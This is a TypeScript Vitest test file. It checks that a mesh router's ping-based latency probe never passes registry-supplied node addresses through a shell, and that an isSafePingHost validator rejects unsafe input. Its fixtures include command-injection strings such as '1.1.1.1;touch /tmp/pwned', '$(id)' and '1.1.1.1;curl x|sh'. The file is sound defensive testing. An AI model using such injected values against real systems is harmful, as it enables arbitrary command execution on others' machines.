import { beforeEach, describe, expect, it, vi } from 'vitest'

// MI-2: the node IP comes from the shared nova_mesh_nodes table. Latency
// measurement must never build a shell string from it.

const childProcess = vi.hoisted(() => ({
    exec: vi.fn((_cmd: string, _options: unknown, callback: (error: Error | null) => void) => callback(null)),
    execFile: vi.fn((_file: string, _args: string[], _options: unknown, callback: (error: Error | null) => void) => callback(null)),
}))
vi.mock('node:child_process', () => childProcess)
vi.mock('./mesh-registry.js', () => ({
    getAvailableNodes: async () => [
        { node_id: 'evil', hostname: 'evil', ip: '1.1.1.1;touch /tmp/pwned', capabilities: ['chat'], status: 'online' },
        { node_id: 'evil2', hostname: 'evil2', ip: '$(id)', capabilities: ['chat'], status: 'online' },
        { node_id: 'flag', hostname: 'flag', ip: '-f', capabilities: ['chat'], status: 'online' },
        { node_id: 'good', hostname: 'good', ip: '100.64.1.23', capabilities: ['chat'], status: 'online' },
    ],
}))

describe('MI-2 mesh-router latency probe', () => {
    beforeEach(() => {
        childProcess.exec.mockClear()
        childProcess.execFile.mockClear()
    })

    it('never passes registry-controlled addresses through a shell', async () => {
        const { scoreAllNodes } = await import('./mesh-router.js')
        await scoreAllNodes('llm_query')
        for (const call of childProcess.exec.mock.calls) {
            expect(String(call[0])).not.toMatch(/touch|\$\(id\)|-f$/)
        }
        const pinged = childProcess.execFile.mock.calls.map(call => call[1] as string[])
        expect(childProcess.execFile.mock.calls.every(call => call[0] === 'ping')).toBe(true)
        const hosts = pinged.map(args => args[args.length - 1])
        expect(hosts).toContain('100.64.1.23')
        expect(hosts).not.toContain('1.1.1.1;touch /tmp/pwned')
        expect(hosts).not.toContain('$(id)')
        expect(hosts).not.toContain('-f')
    })

    it('accepts only literal IPs and plain hostnames', async () => {
        const { isSafePingHost } = await import('./mesh-router.js')
        expect(isSafePingHost('192.168.1.10')).toBe(true)
        expect(isSafePingHost('fd7a:115c:a1e0::1')).toBe(true)
        expect(isSafePingHost('spark-node.tailnet.ts.net')).toBe(true)
        expect(isSafePingHost('1.1.1.1;curl x|sh')).toBe(false)
        expect(isSafePingHost('-c 1000')).toBe(false)
        expect(isSafePingHost('a b')).toBe(false)
        expect(isSafePingHost('')).toBe(false)
    })
})
